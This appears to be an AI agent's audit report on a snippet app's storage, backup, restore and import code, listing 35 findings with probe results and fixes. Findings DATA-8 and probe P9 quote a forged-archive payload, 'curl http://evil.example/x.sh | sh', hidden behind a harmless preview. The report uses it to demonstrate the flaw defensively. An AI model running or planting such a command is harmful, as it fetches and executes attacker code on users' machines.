# Deep audit: data (store, migrations, backup, export/import, importers)

Agent `data`, model Fable. Head audited: `f3571671` (tip of `origin/claude/compassionate-pascal-pod8ux`,
"Coordinator: panel audit in"). Read-only; one temporary probe test
(`crates/snipdeck-portable/tests/probe_data.rs`, deleted at the end, never committed).

`run` = reproduced in the probe test on Linux against the real `Store` and `snipdeck-portable` APIs (the same
calls the controller makes: `import_archive` with `KeepBoards` + `SkipDuplicates` for restore and rebuild,
`run_if_due` for the daily backup). `code` = read only. Nothing here was run on Windows.

Not re-reported (already recorded or decided): EXTRAS-6 (no log file), EXTRAS-8 (headless diagnostics
write), EXTRAS-12 (no portable mode, fixed trash days); backups and exports not carrying the key
(docs/crypto.md, decided); backup deferred while locked (documented); the in-flight branch
`claude/fable2-last` (archive-job threading, rebuild salvage, blob GC during archive jobs, busy state,
`.part` cleanup on quit).

## 1. Coverage

### Files (52 of 52)

| Row | State | How |
|---|---|---|
| `snipdeck-store/src/store.rs` (open, open_locked, close, configure, acquire_lock, gc_blobs, release_blobs, check_integrity, change counter) | driven (open on damaged, empty and newer files; blobs; GC counts) | run |
| `snipdeck-store/src/migrations.rs` (v1 to v9, `migrate`, `write_backup`, `scrub_older_backups`, too-new refusal) | driven (too-new refusal); the rest checked | run / code |
| `snipdeck-store/src/blobs.rs` (store, write_atomically, touch, list, remove, sync_folder) | driven through put, export, import and dry-run | run |
| `snipdeck-store/src/aside.rs` (set_aside, name check) | checked (rebuild itself is in-flight elsewhere) | code |
| `snipdeck-store/src/codec.rs` | checked | code |
| `snipdeck-store/src/error.rs` (`Trouble::of_sqlite`, `of_io`) | checked | code |
| `snipdeck-store/src/lib.rs` | checked | code |
| `snipdeck-store/src/repo.rs` (incl. trash, batch, tags, triggers submodules) | driven (insert, trash, tags, triggers, groups) | run |
| `snipdeck-store/src/schema.rs` | checked | code |
| `snipdeck-store/Cargo.toml` | checked | code |
| `snipdeck-store/tests/blobs.rs`, `change_counter.rs`, `common/mod.rs`, `fixture.rs`, `open.rs`, `release_guard.rs` | checked (read for what they prove and what they leave out) | code |
| `snipdeck-portable/src/archive.rs` (`SafeArchive`, zip-slip, bombs, links, duplicate names) | checked; exercised by every probe import | run / code |
| `snipdeck-portable/src/backup.rs` (`run_if_due`, `prune`, `list_backups`) | driven | run |
| `snipdeck-portable/src/dto.rs` | driven (forged `items.json`) | run |
| `snipdeck-portable/src/error.rs` | checked | code |
| `snipdeck-portable/src/export.rs` | driven | run |
| `snipdeck-portable/src/import.rs` | driven (real and dry-run, forged archive) | run |
| `snipdeck-portable/src/plan.rs` (`drop_duplicates`, `apply`, triggers) | driven | run |
| `snipdeck-portable/src/report.rs`, `limits.rs`, `lib.rs` | checked | code |
| `snipdeck-portable/src/importers.rs` (title_from, clean_label, decode_text) | checked | code |
| `importers/ditto.rs` | checked (read-only open, budgets, text only) | code |
| `importers/csvtable.rs`, `textexpander.rs`, `phraseexpress.rs` | checked | code |
| `importers/espanso.rs` | checked (YAML budgets) | code |
| `importers/beeftext.rs`, `expander.rs` | checked | code |
| `importers/folder.rs` | checked | code |
| `importers/history.rs` | checked | code |
| `importers/copyq.rs` | checked for caps and decode path only; the tab and MIME mapping not walked line by line | code |
| `snipdeck-portable/Cargo.toml` | checked | code |
| `snipdeck-portable/tests/archive_roundtrip.rs`, `backup.rs`, `common/mod.rs`, `expanders.rs`, `groups.rs`, `hostile.rs`, `importers.rs`, `triggers.rs`, `validation.rs` | checked (test names and helpers; `common` and `backup` helpers reused by the probe) | run / code |
| `snipdeck-app/src/maintenance.rs` | checked | code |
| `snipdeck-app/src/settings_store.rs` | checked | code |
| `snipdeck-app/src/drafts.rs` | checked | code |
| `snipdeck-app/tests/import_preview.rs`, `tests/rebuild.rs` | checked | code |
| Also read, outside the list, because the data paths go through them: `snipdeck-app/src/controller/settings_ctl.rs` (backup, restore, rebuild, import, export, erase), `paths.rs`, `failure.rs`, `main.rs` (start-up open), `snipdeck-ui/ui/toast_texts.slint`, `settings.slint` (Backups page) | checked | code |

### Interactions and states

| Row | State | How |
|---|---|---|
| Export, then import into an empty library (restore and rebuild options) | driven (P1, P4) | run |
| Restore a backup into the library it came from, changed and unchanged | driven (P3, P3b) | run |
| Round trip of tags, lists, boards, groups, order, triggers | driven (P1, P4, P4b) | run |
| Round trip of colours, Sensitive items, item kinds | checked against the existing tests (`archive_roundtrip.rs`, `backup.rs`) | code |
| Start-up on a header-damaged, zero-length and newer-version database | driven (P5, P5b, P5c) | run |
| Daily backup with one blob file missing | driven (P2) | run |
| Daily backup when today's file exists but is empty | driven (P8) | run |
| Import preview (dry run) cost and side effects | driven (P7: 20 MB archive) | run |
| Forged `.snipdeck` (preview text, trigger, use count) | driven (P9) | run |
| Hostile archives: zip-slip, traversal, bombs, deep nesting, invalid UTF-8, huge entries | checked: `archive.rs` and `tests/hostile.rs`, `validation.rs` cover them; no gap found | code |
| CSV formula injection | not applicable: there is no CSV (or any text) export; CSV import stores cells as text | code |
| Migration interrupted half way | checked (each step in one transaction with its `user_version`); not driven | code |
| Downgrade refusal | driven (P5c) | run |
| Back up now, Restore, Rebuild, Erase, Export, Import buttons through the UI harness | not reached (the controller paths were read and the library calls under them driven; the Settings page itself belongs to the main/extras agents and archive jobs are in flight) | code |
| Disk full | not reached (needs a size-limited file system); code paths read | code |
| Read-only data folder | not reached as a run (tests run as root, which ignores file modes); error mapping read | code |
| OneDrive or network data folder, two instances on two PCs | not reached (Windows and a sync client needed) | code |
| Two instances on one PC | checked (`snipdeck.lock`, `File::try_lock`; covered by `tests/open.rs`) | code |
| `--data-dir` | checked (`paths.rs`); the Erase interaction with it is DATA-7 | code |
| Windows rename durability, DPAPI key, antivirus holding files | not reached (Windows only) | code |
| Logs during probes | checked: the library crates print nothing; the app's `trace!` lines for these paths have no file to go to (EXTRAS-6) | run |

Counts: 52 of 52 files covered, none skipped (17 touched by a probe run, 35 by reading only); 22 interaction rows:
11 driven, 6 checked by reading, 5 not reached.

## 2. Findings

Probe numbers are from one run on this head; the store is a temporary folder, time is fixed.

| Id | Sev | Lens | Evidence | How | Fix aimed at the class | Effort |
|---|---|---|---|---|---|---|
| DATA-1 | high | Broken (data loss) | Restore and Rebuild merge with `MergeStrategy::SkipDuplicates` (`settings_ctl.rs:652`), which compares content only (`plan.rs` `drop_duplicates`). P1: two items with the same text, different titles and lists, one with trigger `;ty`; export, then import into an EMPTY library with the restore options: `items_added=1 duplicates_skipped=1 live=1 triggers=0 lists=2`. The second item and its trigger are gone, and the report calls it a duplicate. Same-text items are normal (a signature kept in two lists, the same reply under two triggers). | run | A backup written by Snipdeck is a faithful copy: restore and rebuild must match items by identity (item id, or content + title + list path + trigger), never by content alone, and must never drop one archive item as a duplicate of another archive item. Keep content-only skipping for foreign imports only, and show it in the preview. | M |
| DATA-2 | medium | Broken, UX | Restore never merges into an existing board or list: `plan.rs` `apply` always calls `insert_board`. P3: sample library (boards Work, Home), one item moved to Trash, then Restore of the backup taken before: boards after = `["Work","Home","Home"]`, `items_added=1`, `lists_added=2`; the trashed original stays in Trash. One lost item restored costs a second "Home" board and two extra lists; a few restores leave a pile of same-named boards. | run | Restore of a Snipdeck backup puts each missing item back in its own board and list (match by id, then by name), and creates a board only when none matches. Say in the result where the items went. | M |
| DATA-3 | medium | Broken, Copy | A backup is not the whole library. P4: round trip into a fresh store: tags 3 to 2 (a tag no item uses is lost), no warning. P4b: a board holding only an empty list is dropped (boards 2 to 1), no warning. By code (`export.rs`): only live items are written, so the Trash is not in a backup; groups with no written member, Recent, settings and drafts are not in it either. The Backups page says a backup "Saves every board, list and item". | run / code | Decide what a backup is and make export, restore and the text agree: either write empty boards, empty lists, unused tags and the Trash (with their state), or name what is left out next to the button. Add a round-trip test that compares the whole library (boards, lists, tags, groups, trash), not only items. | M |
| DATA-4 | high | Broken (silent loss of protection) | One unreadable attachment stops every backup and every export: `export.rs` reads each blob with `self.lib.read(content)?`. P2: 6 items, one image blob file removed: the daily backup returns `Err("blob ... not found")` and `backups/` holds 0 files, so the 5 healthy items are not backed up either. The toast is "Couldn't make today's backup. Check the disk has room..." (`toast_texts.slint:279`), which is the wrong cause, and with no log file (EXTRAS-6) nothing names the item. From then on no new backup is made and the old ones age. The same holds for one attachment over 64 MiB, a library over 100,000 items or over 8 GiB (`limits.rs`, `export.rs:187`): the toast says so (cause 6) but the backup is not made at all. | run / code | A backup must degrade, not stop: write everything readable, leave the unreadable or over-limit item out, record it in the manifest and tell the user which item (title, list) in a toast that stays and in Settings. The weekly integrity check should compare blob files with rows and report a missing file before the backup trips on it. | M |
| DATA-5 | high | Broken, UX | A database that cannot be opened ends the app at start: `main.rs:938` maps the `Store::open` error to a message box and exits. P5: 100 header bytes overwritten gives `Err("database error: file is not a database")`. Rebuild from a backup lives in Settings inside the running app, so it cannot be reached exactly when it is needed. The same exit follows a failed migration (for example disk full during the `VACUUM INTO` copy in `migrations.rs:216`). The text shown is the raw English store error. | run / code | Start-up failure opens a recovery window, not a message box: the cause in plain words, "Rebuild from the newest backup" (the list of backups with dates and sizes), "Open the data folder", "Try again". All of it translated. | M |
| DATA-6 | high | Broken (silent data loss) | A zero-length `snipdeck.db` opens as a new empty library with no word to the user. P5b: one item stored, then the file truncated to 0 bytes and the WAL removed: `Store::open` returns `Ok`, 0 items. This is what a crashed sync client, a full disk or a failed copy leaves. Then the daily backup of the empty library is taken, and after "Backups to keep" days (default 7) every good backup has rotated out (`backup.rs` `prune` keeps the newest N by date, no content check). | run / code | Treat "the folder has blobs, backups or a lock history but the database is empty or new" as damage: stop and offer the recovery window of DATA-5. Independently, never let a backup that is much smaller than the previous one (items down by more than a set share, or zero) push an older one out; keep it and ask. | M |
| DATA-7 | high | Broken (destroys files that are not ours) | Erase library deletes every entry of the data folder whose name does not start with `settings` and is not `logs` or `snipdeck.lock`, with `remove_dir_all` for folders (`settings_ctl.rs:237-262`). With `--data-dir` pointed at a folder that holds anything else (Documents, a synced folder, a USB stick root) Erase removes those files and folders too. Nothing checks that the names are Snipdeck's. | code | Delete by allow-list, not deny-list: `snipdeck.db*`, `blobs/`, `backups/`, `drafts/`, `maintenance.json*`, `snipdeck.damaged-*`, `*.pre-v*.bak`. Leave anything else and say so. Add a test that plants a stranger file and folder and finds them after Erase. | S |
| DATA-8 | medium | Security | The list text of an imported `.snipdeck` item is taken from the archive, not from the item (`import.rs`: `item.preview = Item::preview_of(preview, ...)` when the archive has one). P9: forged archive, preview shown `"sudo apt update"`, text that pastes `"curl http://evil.example/x.sh | sh"`; no warning in the preview or the report. A shared snippet file can show one thing and paste another. | run | Never trust derived fields from a file: recompute the preview (and kind, sizes, search text) from the content on import, for every non-sensitive item. Keep the archive's preview only where the content cannot be read (a sensitive item with no key), and mark it. | S |
| DATA-9 | medium | Security, UX | Import installs typed triggers without asking. P9: the forged archive carries trigger `"a"` (one character is a valid `Trigger`, `trigger.rs:19`); after import `triggers=["a"]`, so typing "a" in any app would expand the item. The import preview in Settings shows item, list and tag counts but no trigger count and no way to leave triggers out. | run / code | Anything an import adds that acts outside the app (triggers, and later hotkeys) is listed in the preview with its count and the codes, and is opt-in for files from elsewhere. Triggers shorter than two characters from an import are dropped with a note. | S |
| DATA-10 | low | Security, Broken | Counters and times from an archive are taken as they are. P9: `use_count=4000000000` accepted. `prefix_of` ranks suggestions by use count ("the most used wins", `trigger.rs:105`), so a shared file can put its items on top; future timestamps sort it first in "recent" orders. | run | Clamp on import: use count to 0 for foreign files (keep it only for a restore of an own backup), times to no later than now. | S |
| DATA-11 | medium | Performance | The import preview is a full import that is rolled back. P7: 20 MB archive of 1 MB images: dry run 260 ms, real import 237 ms; 0 blob files left after the dry run, so every blob was written, synced and scrubbed once for the preview and again for the import. For a 2 GB backup that is the whole restore time twice and 2 GB of extra writes, before the user has pressed Restore. | run | The preview reads the manifest and `items.json` and counts; it writes nothing. Verify hashes while streaming in the real import only. | M |
| DATA-12 | high | Broken | A library can make a backup that it cannot restore. On import every decrypted sensitive payload is held in memory and counted against `MEMORY_BUDGET`, 256 MiB (`import.rs:851`, `1009-1016`, error "decrypted size"); export has no matching cap. A library with more than 256 MiB of Sensitive attachments backs up every day and then fails Restore and Rebuild with a limit error. Not driven (a 256 MiB probe would take the shared disk). | code | Every limit the reader enforces is enforced by the writer too (one shared table, one test that walks both). Better: decrypt and store one payload at a time so the cap is per item, not per archive. | M |
| DATA-13 | medium | Missing | Backups live only in `<data folder>/backups` on the same disk as the library; the place cannot be changed (no setting in `settings.slint` 1385-1760, `backup.rs` takes `data_dir`). A dead disk, a stolen laptop or Erase takes the library and every backup together. Ditto lets the database sit on any path including a network share; TextExpander keeps the library in its cloud. | code | A "Backup folder" setting (any folder: a second disk, a synced folder; safe there because a backup is one finished file written by rename), shown with its free space and the date of the last good backup. | M |
| DATA-14 | medium | Missing | Rotation keeps the newest N daily files (1 to 60, default 7) and nothing older. A loss noticed after N days (an emptied list, DATA-6) has no backup left that predates it. | code | Tiered keeping: N daily plus some weekly and monthly copies, and the rule of DATA-6 that a suspect backup never replaces a good one. | S |
| DATA-15 | medium | Broken | "Back up now" on a day that already has a backup overwrites that file (`settings_ctl.rs:365-367`, `export_to_path(..., &existing)`). The usual moment to press it is after something went wrong, which replaces the morning's good copy with the damaged state. | code | A manual backup is its own file (`snipdeck-backup-YYYYMMDD-HHMM`), never a replacement, and does not count against the daily rotation. | S |
| DATA-16 | low | Broken | The daily backup is "done" when today's file exists (`backup.rs:120`, `path.exists()`), whatever is in it. P8: a zero-byte file with today's name gives `NotDue`; nothing is written. A zero-byte or cut-off file from a sync client or a full disk blocks the day's backup. | run | Today's backup counts only if it opens and its manifest reads; otherwise write it again. | S |
| DATA-17 | low | Broken | Lowering "Backups to keep" removes nothing until the next new backup is written (`prune` runs only on creation, `backup.rs:134`); raising it cannot bring files back, which is fine, but the setting gives no feedback either way. | code | Apply the setting when it changes and say how many files were removed. | S |
| DATA-18 | low | Broken, Missing | The copy made before a schema upgrade (`snipdeck.db.pre-v<N>.bak`, `migrations.rs:216-218`) is the database only, not the blobs, is never removed (only its Recent inbox is scrubbed later, `259`), and nothing in the app can restore it; a user who needs it has to rename files by hand. | code | Keep one upgrade copy, remove it after the new version has run cleanly for some days, and offer it in the recovery window of DATA-5. Document what it does and does not hold. | S |
| DATA-19 | low | Broken | `snipdeck.damaged-<stamp>/` folders left by Rebuild are full copies of the library and are kept for ever (`aside.rs`); nothing lists, sizes or removes them. They also hold Sensitive items the user may since have erased from the live library. | code | Show set-aside copies in Settings with size and date, with "Delete"; remove them on Erase (Erase does this today through the deny-list) and after a set time with a notice. | S |
| DATA-20 | medium | Broken, UX | Import of a `.snipdeck` file always flattens it to one new board with lists named "Board / List" (`settings_ctl.rs:706-712`, `BoardLayout::SingleBoard`); names over `Name::MAX_CHARS` are cut. Restore, which keeps boards, only lists files in `backups/`. So moving to a new PC from an export file loses the board structure, and there is no way to restore from a backup file kept somewhere else. | code | "Restore from file..." next to Restore, accepting any `.snipdeck`; for Import, a choice "keep boards / one board" in the preview. | S |
| DATA-21 | medium | Missing | Export is all or nothing and one format: no export of one list, one board or a selection, and no CSV, JSON, Markdown or Espanso output. Ditto exports selected clips; TextExpander shares single groups and exports CSV. A user cannot hand a colleague one list. (When a CSV export is added it must neutralise cells starting with `=`, `+`, `-`, `@`.) | code | "Export this list / board / selection" from the context menus into the same `.snipdeck` format, then plain formats. | M |
| DATA-22 | medium | Missing, Broken | No sync, and no guard against the unsafe substitute. Nothing detects a data folder inside OneDrive, Dropbox or a network share, where SQLite WAL files and the lock file are not safe (the lock is per machine; two PCs on one synced folder both open the library). Snipdeck's installer default is local, but `--data-dir` and a redirected profile make this easy to reach. | code | Detect the known sync roots and UNC paths at start and warn once with the safe alternative (local library, backup folder in the synced place, DATA-13). Longer term: a real sync or a documented "second PC" flow through backup files. | S / L |
| DATA-23 | low | Copy, UX | A read-only folder or a permission error is reported as "in use by another program": `error.rs:145-147` and `161-163` map `PermissionDenied`, `ReadOnly` and `CannotOpen` to `Trouble::InUse`. The advice ("close other programs") cannot fix a permissions problem. | code | A separate cause "can't write here" with its own text: check the folder's permissions or pick another folder. | S |
| DATA-24 | low | Performance | Maintenance runs on the UI thread 2 s after the panel first shows (`maintenance.rs:44`, `331-395`): the Trash purge, the blob sweep (a walk of every blob file) and, every 7 days, `PRAGMA integrity_check` over the whole database. On a large library that is a visible freeze right when the user has just opened the panel. (The backup export itself is being moved off the UI thread on `claude/fable2-last`; these three are not in that brief.) Not timed here: no 10,000-item run was made for it. | code | Run every maintenance job on the worker that the archive jobs get, and start the first one when the app has been idle, not 2 s after first use. | M |
| DATA-25 | low | Broken | If `maintenance.json` cannot be saved (read-only folder, disk full), the last-run times are lost on restart and every job, including the integrity check, runs again at each start; the failure is only traced. | code | Surface a state file that cannot be written once (it means the folder is not writable, which the user needs to know for the library too). | S |
| DATA-26 | low | Broken | Temp files of the state file are never cleaned: `maintenance.rs:91` writes through `settings_store::create_temp(data_dir, "maintenance.json")`, and `remove_stale_temps` only looks for the `settings.json` stem. A crash between create and rename leaves `maintenance.json.<pid>-n.tmp` for good. | code | One atomic-write helper that owns its cleanup for any stem; call the cleanup for every stem at start. | S |
| DATA-27 | medium | Broken (data loss) | The Trash purge trusts the wall clock. The cutoff is `now - TRASH_DAYS` (`maintenance.rs:365`, `483`); a clock set far forward (a dead CMOS battery, a wrong date typed in, a VM resume) empties the whole Trash 2 s after start, with blob scrub, and cannot be undone. | code | Do not purge on a clock jump: store the last seen time in `maintenance.json` and skip the purge when now is more than a few days past it (or before it); purge at most the items that were due at the last sane time. | S |
| DATA-28 | low | Broken | Draft recovery stops at 256 KiB (`drafts.rs` `MAX_FILE_BYTES`), while an item's text may be 5 MB: the longest texts, the ones that hurt most to lose, get no crash recovery beyond a one-time "draft not saved" notice. Each autosave is two fsyncs plus a zero overwrite of the old file on the UI thread (`drafts.rs:181-202`). | code | Raise the cap to the text limit and write drafts on a worker; keep the zero overwrite. | S |
| DATA-29 | low | Broken (Windows) | A stored attachment is made durable by a rename whose folder is not synced on Windows (`blobs.rs:583-590`, `sync_folder` is a no-op off Unix). After a power cut the database row (WAL, `synchronous=FULL`) can survive while the blob's directory entry does not, which is the missing-blob case of DATA-4. | code | On Windows write the temp file with `FILE_FLAG_WRITE_THROUGH` and rename with `MoveFileExW(MOVEFILE_WRITE_THROUGH)`, or use `ReplaceFileW`; and let the integrity check find rows without files. | S |
| DATA-30 | low | Broken (latent) | `gc_blobs` (`store.rs:263`) removes any unreferenced blob older than the grace time and does not ask `is_pending`; only `release_blobs` does. Safe today because every `put` is inside the insert batch or within the 1 h grace; an editor that holds a pasted image for more than an hour before Save would lose it. | code | `gc_blobs` skips pending and transient blobs explicitly; a test holds a pending blob past the grace time. | S |
| DATA-31 | low | Missing | Importer gaps that drop data quietly: the folder importer reads one level of subfolders and ignores deeper ones with no note (`folder.rs`); the Ditto importer takes text only (images, HTML and RTF clips are skipped; they are counted but not named). | code | Every importer reports what it left out by kind and count in the preview ("412 image clips not imported"); the folder importer either recurses (with the existing budgets) or says which folders it skipped. | S |
| DATA-32 | low | Missing, UX | No undo for an import and no clean-up: an import can add a board, lists, tags and triggers; deleting the board afterwards leaves the tags it created. | code | "Undo import" in the success toast (the import is one transaction, so its ids are known), and tags created by an import go with it when unused. | M |
| DATA-33 | low | Security | Erase removes non-sensitive attachments and the database by plain delete (`settings_ctl.rs:249-254`), not the zero overwrite used for sensitive blobs, and releases the folder lock while it wipes. The UI says "Everything in your library goes". | code | State in the dialog that erased data may be recoverable with disk tools unless the disk is encrypted, or overwrite what is cheap to overwrite (database, WAL, small blobs). Keep the lock through the wipe. | S |
| DATA-34 | low | Missing | Against TextExpander and Ditto, also absent: version history of an item, restoring one item or list out of a backup (it is all or nothing, DATA-2), a check that a backup just written can be read back, a choice of how often to back up, an automatic backup before a bulk act (import, erase, bulk delete, upgrade), and a "last backup: date, size, N items" line that would make DATA-4 and DATA-6 visible. | code | Add the status line and the read-back check first (S); the rest as a backup browser (L). | S / L |
| DATA-35 | low | UX, Copy | Text that does not say what to do next or says the wrong thing: the fallback backup and export toasts blame the disk for every unknown cause (`toast_texts.slint:266`, `279`, `356`), including a damaged attachment (DATA-4); the start-up failure shows the raw store error in English (DATA-5); a limit failure (cause 6) does not name the item. | code | Every data error carries cause, the object (which item or file) and one next step; no "check the disk" unless the cause is known to be the disk. | S |

Total: 35 findings (high 6, medium 13, low 16).

## 3. What was checked and found sound

- Archive reader: zip-slip, absolute and `..` paths, symlink entries, duplicate names, ratio and total-size
  bombs, entry-count cap, JSON depth and size, hash check of every asset (`archive.rs`, `tests/hostile.rs`,
  `validation.rs`). No gap found.
- Ditto database is opened read-only and defensively; Espanso YAML is parsed under budgets; CSV and JSON
  importers read under a size cap; invalid UTF-8 is decoded lossily with a note.
- Migrations: each version in one transaction with its `user_version`; a newer database is refused with
  clear text and no file is touched (P5c).
- Settings file: temp + fsync + rename, damaged file set aside as `settings.json.bad`.
- Import is one transaction; a failed or dry-run import leaves no blob files (P7: 0 files).
- The change counter is reset on every store swap (`settings_ctl.rs` 466, 486, 805).
- Restoring into an unchanged library adds nothing (P3b).

## 4. Probe results (one run, fixed time)

- P1 `items_added=1 dup_skipped=1 live=1 triggers=0 lists=2`
- P2 library of 6 items, one 80 KB image whose blob file was deleted: `run_if_due` returns `Err("blob d515...7e8a not found")`; files in `backups/` afterwards: 0 (no backup at all, the 5 readable items included)
- P3 boards before=2 after=`["Work","Home","Home"]` added items=1 lists_added=2; P3b all zero
- P4 tags 3 to 2, boards 2 to 2, lists 5 to 5, no warnings; P4b boards 2 to 1, no warning
- P5 `Err("database error: file is not a database")`; P5b `Ok(0)`; P5c refused, files untouched
- P7 archive 20 MB: dry run 260 ms, real 237 ms, 0 blob files after the dry run
- P8 zero-byte `backups/snipdeck-backup-20261116.snipdeck`, `run_if_due` at 2026-11-16 10:00: `NotDue` (true); no backup is written that day
- P9 preview `"sudo apt update"`, text `"curl http://evil.example/x.sh | sh"`, triggers `["a"]`,
  `use_count=4000000000`, no warnings

## 5. Could not be verified; what a Windows run must check

1. Read-only data folder and a folder the user may not write: which message appears at start and on save
   (DATA-23); here the tests run as root, so file modes do not bite.
2. Disk full at each write: item save, blob write, daily backup (`.part` left or removed), the `VACUUM INTO`
   copy before a schema upgrade (does the app start afterwards, DATA-5), settings and `maintenance.json`.
3. Data folder inside OneDrive (files on demand on and off) and on a network share: start, save, backup,
   the lock, and two PCs opening the same folder (DATA-22).
4. Two instances on one PC, with the same and with different `--data-dir`: the second one's message.
5. Power cut or process kill right after adding an image: is the blob file there after restart
   (DATA-29); kill during a schema upgrade and during a restore.
6. Antivirus or the indexer holding a blob, the `.part` backup or `settings.json` open during rename.
7. Erase with `--data-dir` set to a folder holding other files (DATA-7): do they survive. Use a throwaway
   folder.
8. Timings on a real disk with a 10,000-item library and 1 GB of attachments: start-up maintenance
   (DATA-24), the import preview against the import (DATA-11), the daily backup.
9. A library with more than 256 MiB of Sensitive attachments: back up, then restore (DATA-12).
10. Clock set forward 60 days, start, and look at the Trash (DATA-27); use a copy of the library.
11. The DPAPI-held key after restore on another Windows account or PC (decided behaviour, but the text
    shown at that moment was not seen).
